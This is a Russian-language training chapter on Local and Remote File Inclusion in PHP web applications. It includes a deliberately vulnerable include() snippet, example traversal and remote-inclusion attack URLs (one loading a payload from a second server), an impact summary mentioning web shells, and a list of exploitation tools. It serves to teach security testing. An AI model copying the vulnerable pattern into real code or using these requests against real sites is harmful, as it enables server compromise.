# LFI/RFI (Local/Remote File Inclusion)

> [!info] Путь в курсе
> Глава 4: Веб-приложения и безопасность веб-приложений / Часть 3: Анализ уязвимостей веб-приложений / LFI/RFI (Local/Remote File Inclusion)
>
> **Кейсы:** [4.05 Эксплуатация LFI](../../cases/web/4.05%20Эксплуатация%20LFI.md)

## Что такое LFI и RFI

**LFI** (Local File Inclusion)** **- уязвимость, позволяющая специалисту по анализу защищенности подключить к исполняемому скрипту локальный файл, находящийся на том же сервере. Возникает, когда приложение динамически подключает файлы на основе пользовательского ввода и не проверяет переданный путь.

**RFI** (Remote File Inclusion) - разновидность той же уязвимости, но с подключением удалённого файла, расположенного на другом сервере. RFI считается более опасной, поскольку позволяет специалисту по анализу защищенности выполнить произвольный код, загруженный с внешнего ресурса.

## Как устроена уязвимость

В основе **LFI **и **RFI **лежит одна и та же ошибка: приложение использует пользовательский ввод для построения пути к включаемому файлу без должной валидации. Рассмотрим уязвимый код на PHP:

```
$lang = $_GET['lang'];
include($lang . '.php');
```

Здесь скрипт ожидает получить в параметре **lang **название языкового модуля - **ru** или **en **и подключает соответствующий файл из директории **lang/**, но при анализе защищенности можно подставить в этот параметр вместо ожидаемого значения произвольный путь.

## Пример LFI

Для демонстрации LFI необходимо, чтобы на сервере уже присутствовал файл, содержащий PHP-код. В ходе анализа защищенности специалист может загрузить такой файл через другие уязвимости, например через форму загрузки аватара. В нашем примере предположим, что специалист загрузил аватар профиля, и сервер сохранил этот файл.

Далее пользователь открывает корпоративный портал и видит в адресной строке следующий **URL** `http://vulnerable-site.ru/index.php?lang=ru`

![](../../_images/7bbeb9eb9b63.webp)

Он предполагает, что сервер на основе значения параметра **lang** подключает соответствующий файл **ru.php**, из определённой директории. Специалист изменяет значение параметра, подставляя относительный путь к локальному файлу, который в обычных условиях не должен быть доступен извне `http://vulnerable-site.ru/index.php?lang=../uploads/avatar.php`. Поскольку сервер не выполняет фильтрацию вводимых данных, он загружает указанный файл из файловой системы вместо ожидаемого языкового модуля. Как итог, браузер исполняет **avatar.php** с полезной нагрузкой.

![](../../_images/b2607571777e.webp)

Таким образом, специалист получил возможность выполнять произвольные команды на сервере, используя **LFI **в сочетании с предварительно загруженным файлом с полезной нагрузкой.

## Пример RFI

Для успешной эксплуатации **RFI** необходима соответствующая конфигурация сервера, а именно включённая директива **allow_url_include**. Специалист по анализу защищенности создаёт на своём сервере файл с полезной нагрузкой, после чего открывает уязвимый корпоративный портал. Затем специалист подменяет параметр **lang** в запросе, указывая адрес созданного удалённого файла `http://localhost:8000/index.php?lang=http://localhost:9000/rfi_demo.php`

Сервер-жертва выполняет запрос к внешнему ресурсу, включает полученный **PHP**-код в страницу приложения и исполняет команду. На экране отображается результат выполнения этой команды.

![](../../_images/707f6ebd25e6.webp)

Для примера был запущен простейший скрипт, чтобы продемонстрировать успешную эксплуатацию **RFI**.

## Импакт LFI и RFI

Последствия эксплуатации **LFI **и **RFI** зависят от доступа приложения к файловой системе и конфигурации сервера. **LFI** позволяет читать конфиденциальные файлы, а в определенных условиях - выполнять код через **PHP**-обертки или включение логов с внедренной полезной нагрузкой. **RFI** же напрямую ведет к выполнению произвольного кода на сервере, что дает специалисту по анализу защищенности полный контроль, включая установку веб-шеллов, выполнение системных команд, модификацию БД и файлов.

> **Веб-шелл** - это вредоносный скрипт, загруженный на сервер, который позволяет удаленно выполнять системные команды и управлять файловой системой.

## Инструменты, используемые атакующими для обнаружения и последующей эксплуатации Local/Remote File Inclusion

- [**Burp Suite**](https://portswigger.net/burp) - это популярный набор инструментов для тестирования безопасности веб-приложений, который включает функции для обнаружения уязвимостей типа Local/Remote File Inclusion. В Burp Suite есть расширения, такие как **Burp Scanner** и **Burp Intruder**, которые помогают обнаруживать LFI/RFI путем модификации HTTP-запросов и тестирования различных GET и POST параметров. С помощью **Burp Collaborator** можно проверять внешние запросы и взаимодействие с другими системами, что может быть полезно при поиске RFI.
- [**wfuzz**](https://github.com/xmendez/wfuzz) - это инструмент фаззинга, который тестирует параметры HTTP-запросов, подставляя различные полезные нагрузки. Он используется для автоматического перебора полезных нагрузок LFI путем подстановки их в URL или в параметры запроса.
- [**liffy**](https://github.com/mzfr/liffy) - небольшой инструмент, написанный на Python для поиска LFI.
- [**LFISuite**](https://github.com/D35m0nd142/LFISuite/) - это полностью автоматический инструмент, способный сканировать и эксплуатировать уязвимости локального включения файлов, используя множество различных методов атаки.
- [**fimap**](https://github.com/kurobeats/fimap) - имеет возможность поиска и эксплуатации LFI и RFI уязвимостей.
- [**V3n0M-Scanner**](https://github.com/v3n0m-Scanner/V3n0M-Scanner/) - продвинутый сканер для поиска уязвимостей различного типа, в том числе LFI/RFI.
